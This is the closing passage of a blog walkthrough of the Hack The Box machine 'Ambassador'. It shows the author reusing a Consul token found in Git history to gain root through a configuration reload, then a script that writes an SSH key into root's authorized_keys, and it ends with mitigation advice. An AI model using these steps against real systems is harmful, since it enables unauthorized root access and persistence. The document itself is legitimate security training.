developer@ambassador:/etc/consul.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/consul/
total 16
<span class="nt">-rw-r--r--</span> 1 consul consul  394 Mar 13  2022 checkpoint-signature
<span class="nt">-rw-------</span> 1 consul consul   36 Mar 13  2022 node-id
drwxr-xr-x 3 consul consul 4096 Mar 13  2022 raft
drwxr-xr-x 2 consul consul 4096 Mar 13  2022 serf

developer@ambassador:/etc/consul.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/my-app/
total 8
drwxrwxr-x 4 root root 4096 Mar 13  2022 <span class="nb">env
</span>drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
</pre></td></tr></tbody></table></code></div></div>

<p>It looked like the widget from the MySQL database I had used to get the SSH password.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>developer@ambassador:/etc/consul.d<span class="nv">$ </span><span class="nb">cd</span> /opt/my-app/whackywidget/

developer@ambassador:/opt/my-app/whackywidget<span class="nv">$ </span><span class="nb">ls
</span>manage.py  put-config-in-consul.sh  whackywidget

developer@ambassador:/opt/my-app/whackywidget<span class="nv">$ </span><span class="nb">cat </span>put-config-in-consul.sh 
<span class="c"># We use Consul for application config in production, this script will help set the correct values for the app</span>
<span class="c"># Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running</span>

consul kv put whackywidget/db/mysql_pw <span class="nv">$MYSQL_PASSWORD</span>

developer@ambassador:/opt/my-app/whackywidget<span class="nv">$ </span>consul kv get whackywidget/db/mysql_pw
Error querying Consul agent: Unexpected response code: 403 <span class="o">(</span>Permission denied: token with AccessorID <span class="s1">'00000000-0000-0000-0000-000000000002'</span> lacks permission <span class="s1">'key:read'</span> on <span class="s2">"whackywidget/db/mysql_pw"</span><span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The script was adding a password to Consul. But I did not have permission to access it. Again, it needed to run as root. I kept looking on the server. I ran <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a> on it. It found what I needed, but I missed it when looking at the results.</p>

<p>Eventually, I was going back to the widget code to see if I missed something. I was using <code class="language-plaintext highlighter-rouge">tab-tab</code> to get Bash to autocomplete the paths for me. And when it displayed the list of folders in <code class="language-plaintext highlighter-rouge">/opt/my-app</code>, I saw what I had missed in linPEAS.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">cd</span> /opt/
consul/ my-app/ 

developer@ambassador:~<span class="nv">$ </span><span class="nb">cd</span> /opt/my-app/
<span class="nb">env</span>/          .git/         whackywidget/ 
</pre></td></tr></tbody></table></code></div></div>

<p>There was a <code class="language-plaintext highlighter-rouge">.git</code> folder. I changed the app folder and checked the Git history.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">cd</span> /opt/my-app/
developer@ambassador:/opt/my-app<span class="nv">$ </span>git status
On branch main
nothing to commit, working tree clean
developer@ambassador:/opt/my-app<span class="nv">$ </span>git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c <span class="o">(</span>HEAD -&gt; main<span class="o">)</span>
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore


developer@ambassador:/opt/my-app<span class="nv">$ </span>git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55
diff <span class="nt">--git</span> a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
<span class="nt">---</span> a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ <span class="nt">-1</span>,4 +1,4 @@
 <span class="c"># We use Consul for application config in production, this script will help set the correct values for the app</span>
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
<span class="nt">-consul</span> kv put <span class="nt">--token</span> REDACTED whackywidget/db/mysql_pw <span class="nv">$MYSQL_PASSWORD</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The previous commit was using a token to set the password in Consul. I tried using the token to reload the configuration and it worked.</p>

<h3 id="success"><span class="mr-2">Success</span><a href="#success" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>developer@ambassador:/opt/my-app<span class="nv">$ </span>consul reload <span class="nt">--token</span> REDACTED
Configuration reload triggered
</pre></td></tr></tbody></table></code></div></div>

<p>I had to copy my configuration again since the cleanup script had erased it. I reloaded again, and a few seconds later, I got a hit on my web server. I had code execution.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


10.129.228.56 - - [11/Nov/2022 15:10:07] code 404, message File not found
10.129.228.56 - - [11/Nov/2022 15:10:07] "GET /consul HTTP/1.1" 404 -
</pre></td></tr></tbody></table></code></div></div>

<p>I modified the exploit script to open a reverse shell instead of sending a web request. A few seconds later, I got a hit on my netcat listener. I was connected as root, but the connection got closed immediately. I thought it was the timeout of 1 second that killed it so I changed it to 24 hours. But my connection got killed anyway.</p>

<p>I could have tried to figure it out, but I thought it would be simpler to go another way. I changed the script to copy my SSH public key to root‚Äôs authorized keys.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/exploit.sh
<span class="c">#!/bin/bash</span>

<span class="nb">mkdir</span> /root/.ssh/
<span class="nb">chmod </span>700 /root/.ssh

<span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"ssh-rsa AAAA..."</span> <span class="o">&gt;</span> /root/.ssh/authorized_keys
<span class="nb">chmod </span>600 /root/.ssh/authorized_keys
</pre></td></tr></tbody></table></code></div></div>

<p>Then, I connected as root and read the flag.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ssh root@target                                          
The authenticity of host <span class="s1">'target (10.129.228.56)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>target<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 11 Nov 2022 08:18:23 PM UTC

  System load:           0.15
  Usage of /:            80.9% of 5.07GB
  Memory usage:          49%
  Swap usage:            0%
  Processes:             236
  Users logged in:       1
  IPv4 address for eth0: 10.129.228.56
  IPv6 address for eth0: dead:beef::250:56ff:feb9:dadc

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 27 14:48:10 2022 from 10.10.14.6

root@ambassador:~# ls
cleanup.sh  root.txt  snap

root@ambassador:~# cat root.txt 
REDACTED
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>This machine was really fun. There were multiple vulnerabilities that I had to use to get to root, but they would be simple to fix if I wanted to make the box more secure.</p>

<p>The first issue was with the version of Grafana. The version used has a known vulnerability, so it should have been updated. The admin password should also have been changed. I was not able to use my access to Grafana to gain access. But on a real server, this could allow an attacker to access sensitive data.</p>

<p>Next, the MySQL port should not have been open on the internet. It should only be available to the servers that need access to it. In this case, localhost would have been enough. There was also a password stored in clear in that database. It should have been hashed, not encoded.</p>

<p>Once on the machine, I should not have been allowed to write to the Consul configuration. Even without the ability to restart the service, on a real server, I could have waited for the server to reboot and get code execution then.</p>

<p>Having the Git repository on the machine was also a problem. There is no reason to have the repository on the server. The deployment should only send the needed files.</p>

<p>And if credentials are committed to a Git repository they should be invalided immediately. Removing them from the code is not enough. Anyone with access to the repo can see them, and use them if they are still valid.</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/walkthrough/"
          class="post-tag no-text-decoration" >Walkthrough</a>
      
      <a href="/tags/hacking/"
          class="post-tag no-text-decoration" >Hacking</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >Medium</a>
      
      <a href="/tags/machine/"
          class="post-tag no-text-decoration" >Machine</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+Ambassador+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Ambassador%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+Ambassador+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Ambassador%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Ambassador%2F&text=Hack+The+Box+-+Ambassador+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Health/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673020800"
    data-df="ll"
    >
  Jan  7, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Health</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.

It started with using a web application...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/2023/01/HTB/UpDown">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674230400"
    data-df="ll"
    >
  Jan 21, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - UpDown</h3>
            <div class="text-muted small">
              <p>
                





                It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.


  Room: UpDown
  Difficulty: Medium
  URL: https://app.hackthebox.com/machine...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Awkward/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1677254400"
    data-df="ll"
    >
  Feb 25, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Walkthrough - Awkward</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get r...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/2023/01/HTB/UpDown" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - UpDown</p>
  </a>
  

  
  <a href="/posts/HackTheBox-Walkthrough-Photobomb/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Photobomb</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          ¬© 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

